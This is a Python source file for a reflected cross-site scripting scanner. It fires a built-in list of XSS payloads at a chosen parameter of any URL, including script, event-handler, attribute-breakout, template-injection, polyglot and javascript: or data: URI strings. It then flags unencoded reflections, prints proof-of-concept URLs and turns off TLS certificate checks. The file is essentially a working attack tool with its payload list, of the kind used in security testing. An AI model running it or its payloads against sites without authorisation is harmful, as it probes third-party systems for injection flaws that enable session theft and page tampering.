#!/usr/bin/env python
"""xss_scan.py — XSS scanner (Dalfox-style): payload delivery + execution verification.

Delivers XSS payloads to a parameter, checks for: (1) reflection in the
response (necessary), (2) the context it lands in (HTML/attr/script/JS),
(3) whether output encoding neutralizes it. Generates a PoC URL for confirmed
findings. For DOM-based XSS, pairs with browser_probe.py (headless execution).

Usage: python xss_scan.py <url> [--param name] [--method GET|POST]
       [--data 'k=v'] [--concurrency 6] [--context-aware]
"""
import argparse, json, sys, urllib.request, urllib.parse, urllib.error, ssl, concurrent.futures, re, html

PAYLOADS = [
    ("classic_alert", "<script>alert(1)</script>"),
    ("img_onerror", "<img src=x onerror=alert(1)>"),
    ("svg_onload", "<svg onload=alert(1)>"),
    ("body_onload", "<body onload=alert(1)>"),
    ("input_focus", "<input autofocus onfocus=alert(1)>"),
    ("attr_break", '"><script>alert(1)</script>'),
    ("attr_event", '" onmouseover=alert(1) x="'),
    ("js_break", "';alert(1);//"),
    ("template", "{{constructor.constructor('alert(1)')()}}"),
    ("polyglot", "jaVasCript:/*-/*`/*`/*'/*\"/*/**/(/* */oNcliCk=alert() )//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>"),
    ("href_js", "javascript:alert(1)"),
    ("data_uri", "data:text/html,<script>alert(1)</script>"),
    ("svg_use", "<svg><use href=\"data:image/svg+xml,<svg onload='alert(1)'>\"/></svg>"),
    ("detail_open", "<details open ontoggle=alert(1)>"),
]

def detect_context(body_str, payload):
    """Determine what context the reflection lands in + if it's executable."""
    idx = body_str.find(payload)
    if idx == -1: return {"reflected": False}
    before = body_str[max(0,idx-20):idx]
    after = body_str[idx+len(payload):idx+len(payload)+20]
    in_script = "<script" in body_str[max(0,idx-200):idx].lower()
    in_attr = re.search(r'=\s*["\']?$', before) is not None
    in_html = not in_script and not in_attr
    # check if HTML-special chars survived unencoded
    unencoded = html.unescape(payload) in html.unescape(body_str)
    return {"reflected": True, "context": "script" if in_script else ("attr" if in_attr else "html"),
            "before": before, "after": after, "encoding_bypassed": unencoded}

def test(url, param, payload, method, data_tmpl, ctx):
    try:
        if method == "POST":
            post = data_tmpl.replace("__INJECT__", urllib.parse.quote(payload))
            req = urllib.request.Request(url, data=post.encode(), method="POST")
        else:
            sep = "&" if "?" in url else "?"
            req = urllib.request.Request(f"{url}{sep}{param}={urllib.parse.quote(payload)}")
        req.add_header("User-Agent", "Mozilla/5.0 (compatible; XssScan/1.0)")
        if method == "POST": req.add_header("Content-Type", "application/x-www-form-urlencoded")
        with urllib.request.urlopen(req, context=ctx, timeout=15) as r:
            body = r.read(50000).decode("utf-8", errors="replace")
            reflected = payload in body
            encoded_reflected = html.escape(payload) in body  # server encoded it
            # context detection
            ctx_info = {"reflected": reflected, "encoded": encoded_reflected and not reflected}
            if reflected:
                idx = body.find(payload)
                before = body[max(0,idx-30):idx]
                ctx_info["context"] = "script" if "<script" in body[max(0,idx-200):idx].lower() else ("attr" if re.search(r'["\']\s*$', before) else "html")
                ctx_info["executable"] = True  # reflected unencoded = potentially executable
            return {"payload": payload[:60], **ctx_info, "status": r.status, "poc_url": f"{url}{'&' if '?' in url else '?'}{param}={urllib.parse.quote(payload)}" if reflected and method=="GET" else None}
    except urllib.error.HTTPError as e:
        try: body = e.read(50000).decode("utf-8","replace")
        except: body = ""
        reflected = payload in body
        return {"payload": payload[:60], "reflected": reflected, "status": e.code}
    except: pass
    return None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url"); ap.add_argument("--param", required=True)
    ap.add_argument("--method", choices=["GET","POST"], default="GET")
    ap.add_argument("--data", default="")
    ap.add_argument("--concurrency", type=int, default=6)
    args = ap.parse_args()
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    data_tmpl = args.data or f"{args.param}=__INJECT__"
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futures = {pool.submit(test, args.url, args.param, p[1], args.method, data_tmpl, ctx): p[0] for p in PAYLOADS}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            if r and r.get("reflected"): r["label"] = futures[fut]; results.append(r)
    confirmed = [r for r in results if r.get("executable")]
    print(json.dumps({"target": args.url, "param": args.param, "ok": True,
        "payloads_tested": len(PAYLOADS), "reflected": len(results), "confirmed_executable": len(confirmed),
        "verdict": "XSS CONFIRMED (unencoded reflection in executable context)" if confirmed else ("REFLECTED but likely encoded (informational)" if results else "no reflection"),
        "confirmed": confirmed, "all_reflected": results,
        "note": "reflected+executable = potential XSS. Verify in a real browser (browser_probe.py) for DOM execution proof. Encoded-only = refuted."}, indent=2))

if __name__ == "__main__":
    main()
